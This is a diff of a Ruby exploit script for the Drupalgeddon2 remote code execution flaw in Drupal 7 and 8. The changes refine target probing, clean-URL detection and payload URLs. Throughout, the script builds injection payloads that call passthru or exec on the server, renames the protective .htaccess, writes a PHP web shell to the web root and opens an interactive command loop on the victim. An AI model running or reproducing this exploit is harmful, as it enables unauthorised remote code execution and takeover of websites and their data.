@@ -23,7 +23,7 @@ proxy_port = 8080
 # Settings - General
 $useragent = "drupalgeddon2"
 webshell = "s.php"
-writeshell = true
+try_phpshell = true
 
 
 # Settings - Payload (we could just be happy without this, but we can do better!)
@@ -44,11 +44,10 @@ def http_request(url, type="post", payload="")
 end
 
 
-# Function gen_evil_url <cmd> [shell]
-def gen_evil_url(evil, shell=false)
+# Function gen_evil_url <cmd> [phpfunction] [shell]
+def gen_evil_url(evil, phpfunction="passthru", shell=false)
   # PHP function to use (don't forget about disabled functions...)
   #phpfunction = $drupalverion.start_with?("8")? "exec" : "passthru"
-  phpfunction = "passthru"
 
   #puts "[i] PHP cmd: #{phpfunction}" if shell
   puts "[i] Payload: #{evil}" if not shell
@@ -57,15 +56,15 @@ def gen_evil_url(evil, shell=false)
   # Vulnerable Parameters: #access_callback / #lazy_builder / #pre_render / #post_render
   if $drupalverion.start_with?("8")
     # Method #1 - Drupal 8, mail, #post_render - response is 200
-    url = $target + "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+    url = $target + "#{$clean_url}#{$form}?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
     payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpfunction + "&mail[a][#type]=markup&mail[a][#markup]=" + evil
 
     # Method #2 - Drupal 8,  timezone, #lazy_builder - response is 500 & blind (will need to disable target check for this to work!)
-    #url = $target + "user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+    #url = $target + "#{$form}%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
     #payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=" + evil
   elsif $drupalverion.start_with?("7")
     # Method #3 - Drupal 7, name, #post_render - response is 200
-    url = $target + "?q=user/password&name[%23post_render][]=" + phpfunction + "&name[%23type]=markup&name[%23markup]=" + evil
+    url = $target + "#{$clean_url}#{$form}&name[%23post_render][]=" + phpfunction + "&name[%23type]=markup&name[%23markup]=" + evil
     payload = "form_id=user_pass&_triggering_element_name=name"
   else
     puts "[!] Unsupported Drupal version"
@@ -78,8 +77,10 @@ def gen_evil_url(evil, shell=false)
 
     form_build_id = response.body.match(/input type="hidden" name="form_build_id" value="(.*)"/).to_s().slice(/value="(.*)"/, 1).to_s.strip
     puts "[!] WARNING: Didn't detect form_build_id" if form_build_id.empty?
+    #puts "[i] Form ID: #{$form_build_id}" if not shell
 
-    url = $target + "?q=file/ajax/name/%23value/" + form_build_id
+    url = $target + "#{$clean_url}file/ajax/name/%23value/" + form_build_id
+    #url = $target + "#{$clean_url}file/ajax/name/%23value/" + form_build_id
     payload = "form_build_id=" + form_build_id
   end
 
@@ -129,7 +130,7 @@ puts "[*] --==[::#Drupalggedon2::]==--"
 puts "-"*80
 puts "[i] Target : #{$target}"
 puts "[i] Proxy  : #{proxy_addr}:#{proxy_port}" if not proxy_addr.nil?
-puts "[i] Write? : Skipping writing web shell" if not writeshell
+puts "[i] Write? : Skipping writing web shell" if not try_phpshell
 puts "-"*80
 
 
@@ -152,7 +153,7 @@ end
 
 
 # Try and get version
-$drupalverion = nil
+$drupalverion = ""
 # Possible URLs
 url = [
   # Drupal 6 / 7 / 8
@@ -169,20 +170,22 @@ url = [
 # Check all
 url.each do|uri|
   # Check response
-  response = http_request(uri, "get")
+  response = http_request(uri)
 
   if response.code == "200"
     puts "[+] Found  : #{uri}    (HTTP Response: #{response.code})"
 
-    # Patched already?
+    # Patched already? (For Drupal v8.4.x/v7.x)
     puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"
 
-    # Try and get version from the file contents
+    # Try and get version from the file contents (For Drupal v8.4.x/v7.x)
     $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip
+    $drupalverion = "" if not $drupalverion[-1] =~ /\d/
 
-    # If not, try and get it from the URL (In theory, these will never trigger/work as they will be HTTP 403)
-    $drupalverion = uri.match(/includes\/database.inc/)? "6.x" : nil if $drupalverion.empty?
-    $drupalverion = uri.match(/core/)? "8.x" : "7.x" if $drupalverion.nil?
+    # If not, try and get it from the URL (For Drupal v6.x)
+    $drupalverion = uri.match(/includes\/database.inc/)? "6.x" : "" if $drupalverion.empty?
+    # If not, try and get it from the URL (For Drupal v8.5.x)
+    $drupalverion = uri.match(/core/)? "8.x" : "7.x" if $drupalverion.empty?
 
     # Done!
     break
@@ -190,8 +193,8 @@ url.each do|uri|
     puts "[+] Found  : #{uri}    (HTTP Response: #{response.code})"
 
     # Get version from URL
-    $drupalverion = uri.match(/includes\/database.inc/)? "6.x" : nil
-    $drupalverion = uri.match(/core/)? "8.x" : "7.x" if $drupalverion.nil?
+    $drupalverion = uri.match(/includes\/database.inc/)? "6.x" : "" if $drupalverion.empty?
+    $drupalverion = uri.match(/core/)? "8.x" : "7.x" if $drupalverion.empty?
   else
     puts "[!] MISSING: #{uri}    (HTTP Response: #{response.code})"
   end
@@ -214,6 +217,59 @@ puts "-"*80
 
 
 
+
+# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+
+
+# The attack vector to use
+$form = $drupalverion.start_with?("8")? "user/register" : "user/password"
+# Make a request, check for form
+url = "#{$target}?q=#{$form}"
+puts "[*] Testing: Form   (#{$form})"
+response = http_request(url)
+if response.code == "200" and not response.body.empty?
+  puts "[+] Result : Form valid"
+elsif response.code == "404"
+  puts "[!] Target is NOT exploitable [4] (HTTP Response: #{response.code})...   Form disabled?"
+  exit
+elsif response.code == "403"
+  puts "[!] Target is NOT exploitable [3] (HTTP Response: #{response.code})...   Form disabled?"
+  exit
+elsif response.body.empty?
+  puts "[!] Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response"
+  exit
+else
+  puts "[!] Target is NOT exploitable [1] (HTTP Response: #{response.code})"
+end
+
+
+puts "- "*40
+
+
+# Make a request, check for clean URLs status ~ Enabled: /user/register   Disabled: /?q=user/register
+# Drupal v7.x needs it anyway
+$clean_url = $drupalverion.start_with?("8")? "" : "?q="
+url = "#{$target}#{$form}"
+puts "[*] Testing: Clean URLs"
+response = http_request(url)
+if response.code == "200" and not response.body.empty?
+  puts "[+] Result : Clean URLs enabled"
+else
+  $clean_url = "?q="
+  puts "[-] Result : Clean URLs disabled"
+
+  # Drupal v8.x needs it to be enabled
+  if $drupalverion.start_with?("8")
+    puts "[!] Sorry dave... NOPE NOPE NOPE"
+    exit
+  elsif $drupalverion.start_with?("7")
+    puts "[i] Isn't an issue for Drupal v7.x"
+  end
+end
+puts "-"*80
+
+
 # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
 
@@ -229,15 +285,27 @@ if response.code == "200" and not response.body.empty?
   if not result.empty?
     puts "[+] Result : #{result}"
 
-    puts response.body.match(/#{random}/)? "[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!" : "[!] WARNING: Target might to be exploitable [1]...   Detected output, but didn't match expected result"
+    if response.body.match(/#{random}/)
+      puts "[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!"
+    else
+      puts "[!] WARNING: Target MIGHT to be exploitable [1]...   Detected output, but didn't MATCH expected result"
+      #puts response.body
+    end
   else
-    puts "[!] WARNING: Target might to be exploitable [2]...   Didn't detect any output (disabled PHP function?)"
+    puts "[!] WARNING: Target MIGHT to be exploitable [2]...   Didn't detect ANY output (disabled PHP function?)"
   end
+elsif response.body.empty?
+  puts "[!] Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response"
+  exit
 else
-  puts "[!] Target is NOT exploitable ~ HTTP Response: #{response.code}"
+  puts "[!] Target is NOT exploitable [1] (HTTP Response: #{response.code})"
+  #puts response.body
   exit
 end
 puts "-"*80
+
+
+# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
 
 # Location of web shell & used to signal if using PHP shell
@@ -256,7 +324,7 @@ paths = [
 # Check all (if doing web shell)
 paths.each do|path|
   folder = path.empty? ? "./" : path
-  puts "[*] Testing: Writing To Web Root (#{folder})"
+  puts "[*] Testing: Writing To Web Root   (#{folder})"
 
   # Merge locations
   webshellpath = "#{path}#{webshell}"
@@ -268,7 +336,7 @@ paths.each do|path|
   # By default, Drupal v7.x disables the PHP engine entirely in: ./sites/default/files/.htaccess
   # ...however Drupal v8.x disables the PHP engine using: ./.htaccess
   if path == "sites/default/files/"
-    puts "[i] Moving : ./sites/default/files/.htaccess"
+    puts "[*] Moving : ./sites/default/files/.htaccess"
     cmd = "mv -f #{path}.htaccess #{path}.htaccess-bak; #{cmd}"
   end
 
@@ -287,28 +355,30 @@ paths.each do|path|
     if response.code == "200" and not response.body.empty?
       puts "[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!"
       break
-    elsif response.code == "403"
-      puts "[!] Target is NOT exploitable for some reason [1] (HTTP Response: #{response.code})...    May not be able to execute PHP from here?"
     elsif response.code == "404"
-      puts "[!] Target is NOT exploitable for some reason [2] (HTTP Response: #{response.code})...    Might not have write access?"
+      puts "[!] Target is NOT exploitable [2-4] (HTTP Response: #{response.code})...   Might not have write access?"
+    elsif response.code == "403"
+      puts "[!] Target is NOT exploitable [2-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?"
     elsif response.body.empty?
-      puts "[!] Target is NOT exploitable for some reason [3] (HTTP Response: #{response.code})...    Got an empty response back"
+      puts "[!] Target is NOT exploitable [2-2] (HTTP Response: #{response.code})...   Got an empty response back"
     else
-      puts "[!] Target is NOT exploitable for some reason [4] (HTTP Response: #{response.code})"
+      puts "[!] Target is NOT exploitable [2-1] (HTTP Response: #{response.code})"
+      #puts response.body
     end
-  elsif response.code == "403"
-      puts "[!] Target is NOT exploitable for some reason [5] (HTTP Response: #{response.code})...    May not be able to execute PHP from here?"
   elsif response.code == "404"
-      puts "[!] Target is NOT exploitable for some reason [6] (HTTP Response: #{response.code})...    Might not have write access?"
+      puts "[!] Target is NOT exploitable [1-4] (HTTP Response: #{response.code})...   Might not have write access?"
+  elsif response.code == "403"
+      puts "[!] Target is NOT exploitable [1-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?"
   elsif response.body.empty?
-    puts "[!] Target is NOT exploitable for some reason [7] (HTTP Response: #{response.code}))...    Got an empty response back"
+    puts "[!] Target is NOT exploitable [1-2] (HTTP Response: #{response.code}))...   Got an empty response back"
   else
-    puts "[!] Target is NOT exploitable for some reason [8] (HTTP Response: #{response.code})"
+    puts "[!] Target is NOT exploitable [1-1] (HTTP Response: #{response.code})"
+    #puts response.body
   end
   webshellpath = nil
 
   puts "- "*40 if path != paths.last
-end if writeshell
+end if try_phpshell
 
 # If a web path was set, we exploited using PHP!
 if webshellpath
@@ -319,10 +389,10 @@ if webshellpath
   puts "-"*80
   puts "[i] Fake shell:   curl '#{$target}#{webshellpath}' -d 'c=hostname'"
 # Should we be trying to call commands via PHP?
-elsif writeshell
-  puts "[!] FAILED: Couldn't find writeable web path"
+elsif try_phpshell
+  puts "[!] FAILED : Couldn't find writeable web path"
   puts "-"*80
-  puts "[*] Dropping back direct commands"
+  puts "[*] Dropping back to direct commands"
 end
 
 
@@ -350,7 +420,7 @@ loop do
     result = http_request("#{$target}#{webshell}", "post", "c=#{command}").body
   # Direct commands
   else
-    url, payload = gen_evil_url(command, true)
+    url, payload = gen_evil_url(command, "passthru", true)
     response = http_request(url, "post", payload)
 
     # Check result
